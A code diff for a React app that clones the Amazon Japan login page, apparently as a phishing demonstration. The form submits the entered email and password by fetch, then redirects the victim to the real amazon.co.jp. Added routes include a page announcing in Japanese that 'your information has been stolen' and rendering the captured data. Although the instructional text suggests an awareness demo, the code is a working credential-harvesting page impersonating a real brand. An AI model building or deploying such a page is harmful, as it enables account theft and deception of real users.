@@ -1,11 +1,17 @@
 import React, { useState } from "react";
+import { BrowserRouter, Route, Switch, Link} from "react-router-dom";
 import VisibilityIcon from "@mui/icons-material/Visibility";
 import VisibilityOffIcon from "@mui/icons-material/VisibilityOff";
+import CloseIcon from "@mui/icons-material/Close";
+import Fetch from "../src/Fetch";
 
-function App() {
+function  App() {
   const [email, setEmail] = React.useState("");
   const [password, setPassword] = useState("");
   const [passwordType, setPasswordType] = useState("password");
+
+  const [isValid, setIsValid] = useState(true);
+
 
   const handleSubmit = (event) => {
     event.preventDefault();
@@ -17,7 +23,7 @@ function App() {
       .then((response) => response.json())
       .then((data) => console.log(data))
       .catch((error) => console.error(error));
-    window.location.href = "https://www.amazon.co.jp/";
+      window.location.href = "https://www.amazon.co.jp/"
   };
 
   const [showPassword, setShowPassword] = useState(false);
@@ -32,12 +38,14 @@ function App() {
     setShowPopup(false);
   };
 
-
-
-  
+  const validateSystem = () => {
+    const emailPattern = /^[a-zA-Z0-9.!#$%&'*+/=?^_`{|}~-]+@[a-zA-Z0-9-]/;
+    setIsValid(emailPattern.test(email));
+  };
 
 
   return (
+   <BrowserRouter> 
     <div>
       <img className="amazon-top" src="amazon.png" alt="" />
       <div className="login-frame">
@@ -50,6 +58,7 @@ function App() {
               className="input-form"
               type="text"
               value={email}
+              required
               onChange={(e) => setEmail(e.target.value)}
             />
           </label>
@@ -73,7 +82,6 @@ function App() {
               placeholder={""}
               autoComplete="new-password"
               value={password}
-              required
               onChange={(e) => setPassword(e.target.value)}
             />
 
@@ -95,8 +103,9 @@ function App() {
 
 
           
-          <button type="submit" className="next-button">
+          <button onClick={validateSystem } type="submit"  className="next-button">
             <div className="loginlabel">ログイン</div>
+            { !isValid && <p>Please enter a valid email address or password.</p>}
           </button>
         </form>
 
@@ -122,23 +131,80 @@ function App() {
         </div>
       </div>
       <div className="detail-popup">
+      
         {showPopup && (
           <div className="balloon2">
-            <div>
-              <h4>
-                [ログインしたままにする]チェックボックス{" "}
-              </h4>
+            
+            <div className="header-popup">
+               [ログインしたままにする]チェックボックス    
+               <CloseIcon
+                  className="closeicon" 
+                  onClick={() => closePopup()}></CloseIcon> 
+              </div>
+                
+              
+              <div className="inner-popup">
               <p>
                 「ログインしたままにする」を選択すると、このデバイスでログインが求められる回数が減ります。
               </p>
               <p>
                 お客様のアカウントのセキュリティを保つため、個人でお使いのデバイスでのみこのオプションを使うようにしてください。
               </p>
-              <button onClick={closePopup}>閉じる</button>
-            </div>
+              
+              </div>
           </div>
         )}
       </div>
+    </div>
+
+    <ul>
+      <li>
+        <a href="/click1">Click1</a>
+      </li>
+    </ul>
+
+    <ul>
+      <li>
+        <a href="/click2">Click2</a>
+      </li>
+    </ul>
+    
+    <Switch>
+
+    <Route exact path="/click1">
+      <Click1 />
+    </Route>
+
+    <Route exact path="/click2">
+      <Click2 />
+    </Route>
+
+    </Switch>
+   </BrowserRouter> 
+
+
+
+  );
+
+  
+}
+
+
+function Click1() {
+  return(
+    <div>
+      <p>まずはログインしてみよう。そのあとブラウザバックをしてClick2を押してみよう。</p>
+
+    </div>
+  );
+}
+
+function Click2() {
+  return(
+    <div>
+      <p className="stolen-data">あなたの情報は盗まれています!!!</p>
+
+      <Fetch />
     </div>
   );
 }
